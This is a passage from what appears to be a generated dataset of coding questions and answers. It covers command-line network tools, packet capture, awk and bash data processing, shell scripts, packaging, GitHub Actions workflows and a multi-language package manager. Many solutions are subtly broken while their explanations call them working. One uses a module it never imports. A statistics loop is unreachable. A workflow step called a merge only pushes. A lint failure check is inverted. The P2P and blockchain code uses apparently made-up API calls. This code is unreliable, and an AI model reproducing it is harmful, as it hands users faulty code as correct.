display_top_protocols(top_protos):\n    print(\"Top 10 protocols:\")\n    for proto, count in top_protos:\n        print(f\"{proto}: {count}\")\n\ndef capture_packets(interface):\n    packet_protos = []\n    try:\n        packets = sniff(iface=interface, filter=\"ip\", count=1000)\n        for packet in packets:\n            packet_protos.append(get_packet_protocols(packet))\n    except Exception as e:\n        print(f\"Error capturing packets: {e}\")\n        sys.exit(1)\n\n    top_protocols = process_data(packet_protos)\n    display_top_protocols(top_protocols)\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 2:\n        print(\"Usage: python network_tracer.py <interface>\")\n    else:\n        interface = sys.argv[1]\n        capture_packets(interface)\n```\nThis CLI tool captures network traffic from a specified interface using Scapy library, counts the occurrence of TCP, UDP, and other protocols, and displays the top 10 protocols. Run the script with the interface name as a command-line argument, e.g., `python network_tracer.py eth0`.\n\nQuestion 2: Implement a CLI tool in Bash to check the connection status of multiple remote hosts and output the response times.\n\n**Concept**: Shell Scripting\n\nSolution:\n```bash\n#!/bin/bash\n\n# Usage: ./network_monitor.sh <host1> <host2> ... <hostN>\n\ncheck_connection() {\n    local host=\"$1\"\n    local start_time=$(date +%s.%N)\n    \n    ping -c 1 -W 1 $host &>/dev/null\n    local exit_code=$?\n    \n    local end_time=$(date +%s.%N)\n    local response_time=$(echo \"$end_time - $start_time\" | bc -l)\n    \n    if [ $exit_code -eq 0 ]; then\n        echo -e \"$host:\\tConnected\\tResponse Time: $response_time s\"\n    else\n        echo -e \"$host:\\tDisconnected\"\n    fi\n}\n\nif [ \"$#\" -eq 0 ]; then\n    echo \"Usage: $0 <host1> <host2> ... <hostN>\"\n    exit 1\nfi\n\nfor host in \"$@\"; do\n    check_connection \"$host\"\ndone\n```\nThis Bash script takes one or more hostnames or IP addresses as command-line arguments and checks their connection status using `ping`. It calculates the response time and outputs the result for each host. Run the script with hostnames/IPs, e.g., `./network_monitor.sh google.com 8.8.8.8`."}, {"L2_TASK": "CLI", "L3_TASK": "CLI tools for network troubleshooting", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a CLI tool that can perform deep packet inspection (DPI) on a live network interface, detecting and classifying complex network protocols, analyzing packet contents for anomalies, and generate real-time alerts for potential security threats. The tool should also have an option to capture and store packet data for offline analysis.\n\nConcept: CLI, Network Programming, Protocol Analysis\n\nSolution:\n```python\nimport dpkt\nimport socket\nimport pcap\nimport threading\nimport queue\nimport json\nfrom datetime import datetime\n\nclass PacketAnalyzer:\n    def __init__(self, interface, alert_queue):\n        self.interface = interface\n        self.alert_queue = alert_queue\n\n    def analyze_packet(self, timestamp, packet_data):\n        eth = dpkt.ethernet.Ethernet(packet_data)\n        if eth.type != dpkt.ethernet.ETH_TYPE_IP:\n            return\n\n        ip = eth.data\n        if ip.p != dpkt.ip.IP_PROTO_TCP and ip.p != dpkt.ip.IP_PROTO_UDP:\n            return\n\n        tcp = ip.data if ip.p == dpkt.ip.IP_PROTO_TCP else None\n        udp = ip.data if ip.p == dpkt.ip.IP_PROTO_UDP else None\n\n        # Add protocol classification, anomaly detection, and alert generation\n        # ...\n\n        if tcp or udp:\n            packet_info = {\n                \"timestamp\": timestamp,\n                \"src_ip\": ip.src,\n                \"dst_ip\": ip.dst,\n                \"src_port\": tcp.srcport if tcp else udp.srcport,\n                \"dst_port\": tcp.dstport if tcp else udp.dstport,\n                \"protocol\": \"TCP\" if tcp else \"UDP\"\n            }\n            self.alert_queue.put(packet_info)\n\n    def run(self):\n        cap = pcap.pcap(self.interface)\n        for ts, buf in cap:\n            threading.Thread(target=self.analyze_packet, args=(ts, buf)).start()\n\ndef main():\n    alert_queue = queue.Queue()\n    analyzer = PacketAnalyzer(\"eth0\", alert_queue)\n\n    # Start analyzing packets in a separate thread\n    analyzing_thread = threading.Thread(target=analyzer.run)\n    analyzing_thread.start()\n\n    # Periodically check the alert queue for new alerts and process them\n    while True:\n        if not alert_queue.empty():\n            alert = alert_queue.get()\n            print(f\"ALERT: {datetime.fromtimestamp(alert['timestamp'])} - {alert['protocol']} - {alert['src_ip']}:{alert['src_port']} -> {alert['dst_ip']}:{alert['dst_port']}\")\n            # Save alert details to a file or send to a remote server\n            # ...\n\n    analyzing_thread.join()\n\nif __name__ == \"__main__\":\n    main()\n```\nQuestion 2: Implement a CLI tool that automates network performance benchmarking by continuously measuring latency, packet loss, and jitter between multiple points in a network. The tool should support both IPv4 and IPv6, and generate a detailed report with statistical analysis, comparing the results against predefined thresholds.\n\nConcept: CLI, Network Programming, Performance Optimization\n\nSolution:\n```python\nimport time\nimport random\nimport socket\nimport subprocess\nfrom collections import defaultdict\nfrom statistics import mean\n\nclass NetworkBenchmark:\n    def __init__(self, targets, num_tests=100, timeout=5):\n        self.targets = targets\n        self.num_tests = num_tests\n        self.timeout = timeout\n        self.results = defaultdict(list)\n\n    def ping(self, target, test_num):\n        cmd = ['ping', '-c', '1', '-W', str(self.timeout), target]\n        start_time = time.time()\n        try:\n            output = subprocess.check_output(cmd, text=True)\n        except subprocess.TimeoutExpired:\n            latency = self.timeout * 1000\n        else:\n            latency = float(output.split()[5].split('=')[1].split(',')[0])\n        self.results[target].append({\n            'test_num': test_num,\n            'timestamp': time.time(),\n            'latency': latency,\n            'loss': 0  # Jitter and packet loss not implemented in this simplified example\n        })\n\n    def run(self):\n        for test_num in range(1, self.num_tests + 1):\n            for target in self.targets:\n                threading.Thread(target=self.ping, args=(target, test_num)).start()\n\n    def generate_report(self):\n        for target, test_results in self.results.items():\n            avg_latency = mean(result['latency'] for result in test_results)\n            print(f\"Target: {target}\\nAverage Latency: {avg_latency:.2f} ms\\n\")\n\nif __name__ == \"__main__\":\n    targets = [\"192.168.1.1\", \"8.8.8.8\", \"2001:4860:4860::8888\"]\n    benchmark = NetworkBenchmark(targets, num_tests=500)\n    benchmark.run()\n    benchmark.generate_report()\n```\nNote: These examples assume a Linux environment and use dpkt and subprocess libraries for packet inspection and network communication. In a real-world scenario, you might use more specialized libraries for packet analysis, such as scapy, and consider using a more robust approach for performance benchmarking, like using specialized network testing tools like ping, traceroute, or Ixia Chariot."}, {"L2_TASK": "CLI", "L3_TASK": "Command line data processing", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: You are working with a large CSV file containing sales records. You need to extract the top 10 selling products in the last month and display their product names and total sales.\n\nConcept: Command line data processing, Text processing using `awk`, CSV parsing\n\nSolution:\n```bash\n# Using `awk` to process the CSV file\n# Assuming the CSV file has columns: product_name, sale_date, and sales_amount\n# The sales_amount is in dollars, and the sale_date is in YYYY-MM-DD format\n\nawk -F ',' 'BEGIN {OFS = \",\"; sales = \"\"; product = \"\"} \n            {if ($2 >= \"2023-02-01\" && $2 <= \"2023-02-28\") {\n                sales += $3;\n                if (product == \"\") {\n                    product = $1;\n                }\n            } else {\n                if (sales > 0) {\n                    print product, sales;\n                }\n                sales = \"\";\n                product = \"\";\n            }} \n            END {if (sales > 0) {print product, sales;}}' sales_data.csv | \nsort -rnk2 | head -10\n```\nExplanation: This `awk` command processes the CSV file by splitting the data using comma as the field separator (`-F ','`). It checks if the sale_date is within the last month (February 2023) and accumulates the sales_amount for each product. Once it encounters a new product or the end of the file, it prints the product name and total sales. The output is then sorted in descending order by sales and limited to the top 10 results using `sort` and `head`.\n\nQuestion 2:\nProblem: You need to find the average word length in a text file, excluding common English stop words (e.g., 'the', 'is', 'and', etc.).\n\nConcept: Command line data processing, Text processing using `grep`, `tr`, `awk`, and `sort`\n\nSolution:\n```bash\n# Prepare a list of common stop words\nstop_words=\"the is and of to in that it with for on by are as has have from or this but not be an was we can will have done\"\n\n# Process the text file\ncat text_file.txt | \ngrep -oE '\\b\\w+\\b' | # Extract words\ngrep -v -f <(echo -e \"$stop_words\") | # Exclude stop words\ntr -d '[:punct:]' | # Remove punctuation\nawk '{lengths[length($0)]++} END {sum=0; for (word in lengths) {sum += lengths[word]*length(word)} print \"Average word length:\", sum/NR}' # Calculate average\n```\nExplanation: This command chain first extracts words from the text file (`grep -oE '\\b\\w+\\b'`), then removes the stop words using a temporary file created with `grep -v -f <(echo -e \"$stop_words\")`. Punctuation is removed with `tr -d '[:punct:]'`. Finally, `awk` is used to count the length of each word and calculate the average length across all unique words in the file."}, {"L2_TASK": "CLI", "L3_TASK": "Command line data processing", "Complexity_Level": "extremely difficult", "Response": "Question 1: Design a command-line tool in Python that reads from multiple CSV files in a directory, performs complex data transformations, and writes the output to a new CSV file while maintaining optimal performance. The tool should handle missing data, perform merges, and apply filters based on column conditions.\n\n**Concept**: Command Line Interface, Data Processing, CSV Handling\n\n**Solution**:\n```python\nimport os\nimport csv\nimport pandas as pd\n\ndef read_csv_files(directory):\n    files = [os.path.join(directory, f) for f in os.listdir(directory) if f.endswith('.csv')]\n    data_frames = [pd.read_csv(file) for file in files]\n    return data_frames\n\ndef apply_transformations(data_frames):\n    merged_df = pd.concat(data_frames, ignore_index=True)\n    merged_df.fillna(value=-999, inplace=True)  # handling missing data\n    merged_df = merged_df[(merged_df['column1'] > 10) & (merged_df['column2'] < 50)]  # applying filters\n    transformed_df = merged_df.groupby('group_column').apply(custom_complex_transform).reset_index(drop=True)\n    return transformed_df\n\ndef custom_complex_transform(group):\n    # Add your complex transformation logic here (e.g., calculations, aggregations, etc.)\n    result = group.apply(lambda row: row['column1'] * row['column2'] / group['column3'].mean(), axis=1)\n    return result\n\ndef write_to_csv(transformed_data, output_file):\n    transformed_data.to_csv(output_file, index=False)\n\ndef main():\n    input_directory = '/path/to/csv/files'\n    output_file = 'transformed_output.csv'\n    \n    data_frames = read_csv_files(input_directory)\n    transformed_data = apply_transformations(data_frames)\n    write_to_csv(transformed_data, output_file)\n\nif __name__ == '__main__':\n    main()\n```\nThis solution demonstrates a command-line tool that reads CSV files from a directory, applies data transformations, and writes the result to a new CSV file. The complexity comes from handling multiple files, dealing with missing data, applying filters, and performing a custom complex transformation.\n\nQuestion 2: Create a Bash script that monitors a log file for specific patterns, calculates real-time statistics, and outputs the results to the terminal. The script should handle large log files efficiently, support multiple search patterns, and dynamically update the statistics.\n\n**Concept**: Command Line Interface, Log Processing, Regular Expressions\n\n**Solution**:\n```bash\n#!/bin/bash\n\n# Function to calculate real-time statistics\nfunction process_line() {\n    current_time=$(date +%s)\n    increment_stats \"$1\" $current_time\n}\n\n# Function to increment the statistics for a given pattern\nfunction increment_stats() {\n    pattern=\"$1\"\n    timestamp=\"$2\"\n    ((count[\"$pattern\"]++))\n    ((total_time[\"$pattern\"]+=$(($timestamp - prev_time[\"$pattern\"])))\n    prev_time[\"$pattern\"]=$timestamp\n}\n\n# Initialize variables\ndeclare -A count total_time prev_time\n\n# Read log file line by line, processing each line\ntail -fn0 /path/to/logfile.log | while read -r line\ndo\n    # Search for multiple patterns and process the line if a pattern matches\n    if [[ $line =~ (pattern1|pattern2|pattern3) ]]; then\n        process_line \"${BASH_REMATCH[0]}\"\n    fi\ndone\n\n# Function to display statistics\nfunction display_stats() {\n    echo \"Pattern | Count | Average Time (s)\"\n    for pattern in \"${!count[@]}\"\n    do\n        avg_time=$((${total_time[\"$pattern\"]}/${count[\"$pattern\"]}))\n        printf \"%-10s | %-6d | %-10.2f\\n\" \"$pattern\" \"${count[\"$pattern\"]}\" \"$avg_time\"\n    done\n}\n\n# Continuously display statistics with a 1-second refresh rate\nwhile true\ndo\n    clear\n    display_stats\n    sleep 1\ndone\n```\nThis Bash script monitors a log file for specific patterns, calculates real-time statistics, and displays them on the terminal. It efficiently reads the log file with `tail`, processes lines containing the specified patterns, and updates the statistics dynamically. The script supports multiple search patterns and calculates the average time between occurrences."}, {"L2_TASK": "CLI", "L3_TASK": "Shell script optimization", "Complexity_Level": "medium", "Response": "Question 1: Problem\nSuppose you have a directory containing multiple subdirectories and files, and you need to find all files with a specific extension (e.g., \".txt\") while ignoring hidden files and sorting them by size in descending order. Your current shell script is inefficient and takes too much time to execute. Optimize the script to improve performance.\n\nConcept: Shell Script Optimization\n\nSolution:\n```bash\n#!/bin/bash\n\n# Define the target directory and file extension\ndir=\"/path/to/directory\"\next=\".txt\"\n\n# Use 'find' to locate files, ignoring hidden ones and sorting by size\nfind \"$dir\" -type f -name \"*$ext\" ! -path '*/\\.*' -printf \"%s %p\\n\" | sort -rn\n\n# Explanation:\n# - 'find' is used instead of 'ls' for better performance when dealing with multiple subdirectories\n# - '-type f' specifies that only files, not directories, should be found\n# - '-name \"*$ext\"' looks for files with the given extension\n# - '! -path '*/\\.*'' ignores hidden files and directories\n# - '-printf \"%s %p\\n\"' prints the file size in bytes followed by the file path, separated by a space\n# - 'sort -rn' sorts the output numerically (-n) in descending order (-r)\n```\n\nQuestion 2: Problem\nYou have a shell script that runs a series of commands in a loop, where each iteration appends output to a file. The current implementation opens and closes the file for every iteration, causing significant performance overhead. Optimize the script by opening the file only once and closing it after the loop is completed.\n\nConcept: Shell Script Optimization\n\nSolution:\n```bash\n#!/bin/bash\n\n# Define the output file\noutput_file=\"output.txt\"\n\n# Open the output file for appending, redirect stderr to stdout for logging\nexec 3>>\"$output_file\" 2>&1\n\n# Loop through commands and append output\nfor ((i=1; i<=100; i++)); do\n  command_output=$(some_command \"$i\")\n  echo \"Command $i output: $command_output\" >&3\ndone\n\n# Close the output file after the loop\nexec 3>&-\n\n# Explanation:\n# - 'exec 3>>\"$output_file\" 2>&1' opens file descriptor 3 for appending, redirecting stderr to stdout\n# - 'echo \"Command $i output: $command_output\" >&3' writes to file descriptor 3 instead of opening and closing the file in each iteration\n# - 'exec 3>&-' closes file descriptor 3 after the loop, releasing the file\n```\n\nThese solutions use shell built-ins and commands more efficiently to optimize the performance of the shell scripts. By using 'find' instead of 'ls' and opening the output file only once, we can significantly reduce execution time."}, {"L2_TASK": "CLI", "L3_TASK": "Shell script optimization", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a shell script that efficiently monitors system resource usage and automatically kills processes if they exceed predefined thresholds. The script should handle concurrent processes, log activity, and gracefully restart processes when resource usage drops below the threshold.\n\n**Concept**: Shell Script Optimization, Process Management, Resource Monitoring\n\n**Solution**:\n```bash\n#!/bin/bash\n\n# Configuration\nprocesses=(\"process1\" \"process2\" \"process3\")\nmemory_threshold=1000  # in MB\ncpu_threshold=80       # percent\nlog_file=\"resource_monitor.log\"\n\n# Function to check process resource usage and take action\ncheck_resources() {\n    while true; do\n        for proc in \"${processes[@]}\"; do\n            pid=$(pgrep -f \"$proc\")\n            if [ -z \"$pid\" ]; then\n                echo \"Process $proc not running, restarting...\"\n                start_process \"$proc\"\n            else\n                mem_usage=$(ps -p \"$pid\" -o %mem=)\n                cpu_usage=$(ps -p \"$pid\" -o %cpu=)\n                echo \"$(date) - Process $proc | Memory: $mem_usage% | CPU: $cpu_usage%\" >> \"$log_file\"\n                if (( $(echo \"$mem_usage > $memory_threshold\" | bc -l) )); then\n                    echo \"Process $proc exceeded memory limit, killing...\"\n                    kill -9 \"$pid\"\n                    start_process \"$proc\"\n                elif (( $(echo \"$cpu_usage > $cpu_threshold\" | bc -l) )); then\n                    echo \"Process $proc exceeded CPU limit, killing...\"\n                    kill -9 \"$pid\"\n                    start_process \"$proc\"\n                fi\n            fi\n        done\n        sleep 5\n    done\n}\n\n# Function to start a process\nstart_process() {\n    echo \"Starting process $1...\"\n    # Replace with the actual command to start the process\n    nohup $1 &\n}\n\n# Main script\necho \"Starting resource monitor...\"\nstart_process \"process1\"\nstart_process \"process2\"\nstart_process \"process3\"\ncheck_resources\n```\nIn this script, we define a `check_resources` function that continuously monitors the memory and CPU usage of the processes specified in the `processes` array. If any process exceeds the configured thresholds, the script kills the process and restarts it using the `start_process` function. The script logs all activity in `resource_monitor.log`.\n\nQuestion 2: Create a shell script that compresses the contents of multiple directories recursively, applying different compression levels, and maintaining a detailed log with timestamps, compress ratios, and source file information. The script should also detect and exclude files larger than a specified size.\n\n**Concept**: Shell Script Optimization, File Management, Compression\n\n**Solution**:\n```bash\n#!/bin/bash\n\n# Configuration\ndirectories=(\"dir1\" \"dir2\" \"dir3\")\nmax_file_size=100M  # in bytes\nlog_file=\"compression_log.txt\"\ncompression_levels=(1 3 6 9)\n\n# Function to compress a file\ncompress_file() {\n    local file=$1\n    local level=$2\n    local output=$(basename \"$file\" .*)\"_level_${level}.gz\"\n    local ratio=$(gzip -l \"$file\" | awk '{print $4/$5*100}')\n    gzip -${level} \"$file\" -c > \"$output\"\n    echo \"$(date) - Compressed $file with level $level, ratio: $ratio%, output: $output\" >> \"$log_file\"\n}\n\n# Function to compress a directory\ncompress_directory() {\n    local dir=$1\n    find \"$dir\" -maxdepth 1 -type f -size -$max_file_size -print0 | while IFS= read -r -d '' file; do\n        for level in \"${compression_levels[@]}\"; do\n            compress_file \"$file\" \"$level\"\n        done\n    done\n}\n\n# Main script\necho \"Starting compression...\"\nfor dir in \"${directories[@]}\"; do\n    echo \"Compressing $dir...\"\n    compress_directory \"$dir\"\ndone\necho \"Compression completed.\"\n```\nThis script defines a `compress_file` function that compresses a single file with the specified compression level, logs the details, and calculates the compression ratio. The `compress_directory` function uses `find` to locate files under a directory, excluding files larger than `max_file_size`. It then calls the `compress_file` function for each file and compression level. The main script iterates over the directories and initiates the compression process."}, {"L2_TASK": "Coding Ecosystem", "L3_TASK": "Package management (for all languages)", "Complexity_Level": "medium", "Response": "Question 1: As a developer, you need to create a Python package that can be installed through PyPI. The package should have a simple function to calculate the factorial of a given number. Additionally, the package should have proper documentation and adhere to PEP 8 style guide.\n\n**Concept**: Package Management\n\n**Solution**:\n1. Create a new Python package directory structure:\n```markdown\nmy_factorial/\n|-- my_factorial/\n|   |-- __init__.py\n|-- setup.py\n|-- README.md\n|-- docs/\n|   |-- index.rst\n|-- tests/\n|   |-- test_my_factorial.py\n|-- requirements.txt\n|-- .github/\n|   |-- workflows/\n|   |   |-- ci.yml\n```\n1. Implement `my_factorial` function in `my_factorial/__init__.py`:\n```python\ndef factorial(n):\n    if n == 0:\n        return 1\n    else:\n        return n * factorial(n - 1)\n```\n1. Update `setup.py` for package setup:\n```python\nfrom setuptools import setup\n\nsetup(\n    name=\"my-factorial\",\n    version=\"0.1.0\",\n    description=\"A simple Python package to calculate the factorial of a number.\",\n    long_description=open('README.md', 'r', encoding='utf-8').read(),\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/your-github-username/my-factorial\",\n    author=\"Your Name\",\n    author_email=\"your.email@example.com\",\n    packages=[\"my_factorial\"],\n    install_requires=[\"\"],  # Add any dependencies if necessary\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n)\n```\n1. Create documentation in `docs/index.rst`:\n```rst\nMy Factorial Package\n===================\n\nIntroduction\n------------\n\nThis package provides a simple function to calculate the factorial of a given number.\n\nUsage\n-----\n\nTo use the package, simply call the `factorial` function:\n\n.. code-block:: python\n\n   from my_factorial import factorial\n\n   result = factorial(5)\n   print(result)  # Output: 120\n```\n1. Add tests in `tests/test_my_factorial.py`:\n```python\nimport unittest\nfrom my_factorial import factorial\n\nclass TestFactorial(unittest.TestCase):\n    def test_factorial(self):\n        self.assertEqual(factorial(0), 1)\n        self.assertEqual(factorial(5), 120)\n        self.assertEqual(factorial(10), 3628800)\n\nif __name__ == '__main__':\n    unittest.main()\n```\n1. To run tests, install necessary tools (pytest, black, flake8) in `requirements.txt`:\n```\npytest\nblack\nflake8\n```\n1. Configure CI/CD workflow in `.github/workflows/ci.yml`:\n```yaml\nname: CI\n\non:\n  push:\n    branches: [ main ]\n\njobs:\n  build:\n\n    runs-on: ubuntu-latest\n\n    steps:\n    - uses: actions/checkout@v2\n    - name: Set up Python\n      uses: actions/setup-python@v2\n      with:\n        python-version: 3.8\n    - name: Install dependencies\n      run: |\n        python -m pip install --upgrade pip\n        pip install -r requirements.txt\n    - name: Run tests\n      run: |\n        pytest\n    - name: Check code style\n      run: |\n        black --check .\n        flake8\n```\nWith this setup, you can now create a release and publish the package to PyPI following the appropriate steps.\n\nQuestion 2: You're working on a JavaScript project that"}, {"L2_TASK": "Coding Ecosystem", "L3_TASK": "Package management (for all languages)", "Complexity_Level": "extremely difficult", "Response": "{\"Concept\": \"Package Management\"}\n\nQuestion 1: Develop a custom package manager that supports versioning, dependency resolution, and installation across multiple programming languages, while also providing a unified command-line interface.\n\nSolution:\nTo create a custom package manager with the mentioned features, we will use a combination of language-specific package managers and a wrapper script. The wrapper script will communicate with the language-specific package managers, abstracting away the differences and providing a unified CLI.\n\nHere's an outline of the solution:\n\n1. Create a `package.json` file format that supports specifying dependencies, versions, and target programming languages.\n2. Write a `custom_package_manager.py` script in Python to handle the CLI and interact with the language-specific managers.\n3. Implement language-specific adapters for popular package managers like `npm` (JavaScript), `pip` (Python), `gem` (Ruby), `cargo` (Rust), and `composer` (PHP).\n\nExample Python code (excerpt):\n```python\nimport subprocess\nimport json\nfrom pathlib import Path\n\ndef get_language_manager(language):\n    language_to_manager = {\n        'javascript': 'npm',\n        'python': 'pip',\n        'ruby': 'gem',\n        'rust': 'cargo',\n        'php': 'composer',\n    }\n    return language_to_manager.get(language, None)\n\ndef install_package(package, language, version=None):\n    manager = get_language_manager(language)\n    if not manager:\n        raise ValueError(f\"Unsupported language: {language}\")\n\n    cmd = [manager, 'install']\n\n    if version:\n        cmd.append(f'--version={version}')\n\n    cmd.append(package)\n\n    subprocess.run(cmd, cwd=Path.cwd(), check=True)\n\ndef main():\n    with open('package.json') as f:\n        package_data = json.load(f)\n\n    for dependency in package_data['dependencies']:\n        language = dependency['language']\n        package = dependency['name']\n        version = dependency.get('version')\n\n        install_package(package, language, version)\n\nif __name__ == '__main__':\n    main()\n```\nQuestion 2: Implement a parallel installation feature in the custom package manager that efficiently installs multiple dependencies across different languages in parallel while maintaining dependency order and avoiding conflicts.\n\nSolution:\nTo implement parallel installation with dependency order and conflict resolution, we can use a task queue and a worker pool. The worker pool will handle installing packages, and the task queue will ensure dependencies are installed in the correct order.\n\nExample Python code (excerpt, using `concurrent.futures`):\n```python\nimport concurrent.futures\nimport json\nfrom pathlib import Path\n\n# ... (previous code)\n\ndef install_dependencies(dependencies, language_manager_map, executor):\n    \"\"\"Install dependencies in the correct order using a task queue.\"\"\"\n    task_queue = [(dep, lang, ver) for dep, lang, ver in dependencies]\n    installed_packages = set()\n\n    while task_queue:\n        package, language, version = task_queue.pop(0)\n\n        if package in installed_packages:\n            continue\n\n        manager = language_manager_map[language]\n        install_package(package, language, version, manager)\n\n        installed_packages.add(package)\n\n        # Add dependencies to the task queue\n        for dep in package_data['dependencies']:\n            if dep['name'] not in installed_packages:\n                task_queue.append((dep['name'], dep['language'], dep.get('version')))\n\ndef main():\n    # ... (previous code)\n\n    # Create a language manager map\n    language_manager_map = {\n        'javascript': 'npm',\n        'python': 'pip',\n        'ruby': 'gem',\n        'rust': 'cargo',\n        'php': 'composer',\n    }\n\n    # Create a thread pool executor\n    with concurrent.futures.ThreadPoolExecutor() as executor:\n        dependencies = [(dependency['name'], dependency['language'], dependency.get('version'))\n                        for dependency in package_data['dependencies']]\n        install_dependencies(dependencies, language_manager_map, executor)\n\nif __name__ == '__main__':\n    main()\n```\nNote: This is a simplified and abstract representation of the solution. In a real-world scenario, additional complexity would be required for handling race conditions, dependency conflicts, and other edge cases."}, {"L2_TASK": "Coding Ecosystem", "L3_TASK": "Code repository management", "Complexity_Level": "medium", "Response": "{\"Concept\": \"Code repository management\"}\n\nQuestion 1: You are working on a project with a team, and you need to implement a system that automatically merges pull requests only if all the required tests pass. How would you achieve this using GitHub's workflow and a CI/CD tool like GitHub Actions?\n\nSolution:\n\n1. Create a `.github/workflows/ci-cd.yaml` file in your repository to define the GitHub Actions workflow. This file will describe the steps to run tests and merge pull requests.\n\n```yaml\nname: CI/CD\n\non:\n  pull_request:\n    types: [opened, synchronize, reopened, closed]\n\njobs:\n  run-tests:\n    runs-on: ubuntu-latest\n    steps:\n    - name: Checkout code\n      uses: actions/checkout@v2\n    - name: Setup Node.js\n      uses: actions/setup-node@v2\n      with:\n        node-version: '14'\n    - name: Install dependencies\n      run: npm ci\n    - name: Run tests\n      run: npm test\n      env:\n        CI: true\n    - name: Merge on success\n      if: ${{ success() && github.event.action != 'closed' }}\n      uses: ad-m/github-push-action@master\n      with:\n        github_token: ${{ secrets.GITHUB_TOKEN }}\n        branch: ${{ github.event.pull_request.head.ref }}\n        commit_message: 'Automatic merge after tests passed'\n```\n\nIn this workflow:\n- The `on` field specifies that the workflow should trigger on pull request events.\n- The `run-tests` job runs on an Ubuntu environment, checks out the code, sets up Node.js, installs dependencies, and runs tests.\n- The `Merge on success` step will only run if the previous steps succeeded and the pull request is not closed. It uses a GitHub action to merge the pull request into the base branch.\n\nQuestion 2: You want to enforce a code quality check using a tool like ESLint for JavaScript projects in your code repository. Configure a GitHub Action to run ESLint and fail the build if there are any linting errors.\n\nSolution:\n\n1. Add a `.github/workflows/lint.yaml` file to your repository.\n\n```yaml\nname: Lint\n\non:\n  push:\n  pull_request:\n\njobs:\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n    - name: Checkout code\n      uses: actions/checkout@v2\n    - name: Setup Node.js\n      uses: actions/setup-node@v2\n      with:\n        node-version: '14'\n    - name: Install dependencies\n      run: npm ci\n    - name: Run ESLint\n      run: npm run lint\n      env:\n        CI: true\n    - name: Fail the build on lint errors\n      run: |\n        if [[ $(npm run lint -- --output-file ./lint_results.txt --format json --no-color) ]]; then\n          echo \"ESLint found issues. Check lint_results.txt\"\n          exit 1\n        fi\n```\n\nIn this workflow:\n- The `on` field triggers the workflow on both push and pull request events.\n- The `lint` job runs on an Ubuntu environment, checks out the code, sets up Node.js, installs dependencies, and runs ESLint.\n- The `Fail the build on lint errors` step checks the ESLint output, and if there are any issues, it fails the build with an error message. This ensures that the build won't pass with linting errors."}, {"L2_TASK": "Coding Ecosystem", "L3_TASK": "Code repository management", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop an automated tool that synchronize a local code repository with multiple remote repositories simultaneously, while handling merge conflicts intelligently and maintaining different branching strategies for each repository.\n\nChallenge: This problem involves working with version control systems, understanding branching and merging strategies, and handling complex synchronization scenarios.\n\nSolution:\nFor this problem, we'll use Python and the GitPython library to interact with Git repositories.\n\n```python\nfrom git import Repo\nfrom itertools import product\n\ndef sync_repositories(local_repo_path, remote_repos, branch_strategies):\n    local_repo = Repo(local_repo_path)\n\n    # Iterate through all remote repositories and branch strategies\n    for remote_repo, branch_strategy in product(remote_repos, branch_strategies):\n        remote = local_repo.create_remote('temp_remote', remote_repo)\n        remote.fetch()\n\n        # Handle different branch strategies\n        if branch_strategy == 'mainline':\n            remote_branch = remote.refs.mainline\n        elif branch_strategy == 'topic_branches':\n            remote_branch = remote.refs['topic/{}'.format(local_repo.active_branch.name)]\n        else:\n            raise ValueError('Invalid branch strategy: {}'.format(branch_strategy))\n\n        # Merge remote branch with local, resolving conflicts\n        try:\n            local_repo.git.merge(remote_branch, strategy='resolve')\n            local_repo.git.add('.')\n            local_repo.git.commit(m='Merge from {}'.format(remote_repo))\n        except Exception as e:\n            print('Merge conflict detected in {} with strategy {}: {}'.format(local_repo_path, branch_strategy, e))\n\n        # Push local changes to all remotes\n        for remote in local_repo.remotes:\n            remote.push()\n\n# Example usage\nlocal_repo_path = '/path/to/local/repo'\nremote_repos = ['https://github.com/user/repo1.git', 'https://github.com/user/repo2.git']\nbranch_strategies = ['mainline', 'topic_branches']\n\nsync_repositories(local_repo_path, remote_repos, branch_strategies)\n```\n\nQuestion 2: Build a secure, encrypted, and decentralized code collaboration platform using a peer-to-peer network and a blockchain-based system for version control.\n\nChallenge: This problem combines peer-to-peer networks, cryptography, blockchain, and version control concepts.\n\nSolution:\nFor this problem, we will use Python with libraries like libp2p, cryptography, and Web3.py for blockchain interactions. Note that this is a high-level outline and implementing a complete decentralized system is beyond the scope of a single code snippet.\n\n```python\nimport libp2p\nfrom cryptography.fernet import Fernet\nfrom web3 import Web3\n\nclass DecentralizedCodeCollaborator:\n    def __init__(self, peer_id, private_key, blockchain_url):\n        self.peer_id = peer_id\n        self.private_key = private_key\n        self.blockchain = Web3(Web3.HTTPProvider(blockchain_url))\n        self.network = libp2p.Network(self.peer_id, self.private_key)\n\n    def join_network(self, peers):\n        # Connect to the specified peers\n        for peer in peers:\n            self.network.connect(peer)\n\n    def encrypt_and_send(self, recipient_peer_id, data):\n        # Encrypt data using recipient's public key\n        recipient_key = self.get_peer_public_key(recipient_peer_id)\n        encrypted_data = Fernet(recipient_key).encrypt(data.encode())\n        # Send encrypted data over the network\n\n    def commit_and_store(self, commit_data):\n        # Hash the commit data and store it on the blockchain\n        commit_hash = self.blockchain.web3.sha3(commit_data.encode())\n        transaction = self.blockchain.eth.send_transaction(\n            from_=self.blockchain.eth.default_account,\n            to=self.blockchain.eth.default_account,\n            data=commit_hash,\n        )\n        return transaction\n\n    def get_peer_public_key(self, peer_id):\n        # Retrieve the public key of a peer from the network or blockchain\n        pass\n\n    def handle_received_data(self, data):\n        # Decrypt received data and merge with local repository\n        pass\n\n# Example usage\npeer_id, private_key = libp2p.generate_keys()\nblockchain_url = 'https://mainnet.infura.io/v3/your-project-id'\ncollaborator = DecentralizedCodeCollaborator(peer_id, private_key, blockchain_url)\n\n# Connect to peers and start collaboration\npeers = ['peer1_id', 'peer2_id']\ncollaborator.join_network(peers)\n```\n\nConcepts used:\n1. Code Repository Management\n2. Git\n3. Peer-to-Peer Networks\n4. Blockchain\n5. Version Control\n6. Cryptography"}, {"L2_TASK": "Coding Ecosystem", "L3_TASK": "Integration with IDEs", "Complexity_Level": "medium", "Response": "Question 1: Develop a plugin for a popular IDE (e.g., Visual Studio Code, IntelliJ, or PyCharm) that provides syntax highlighting and code completion for a custom programming 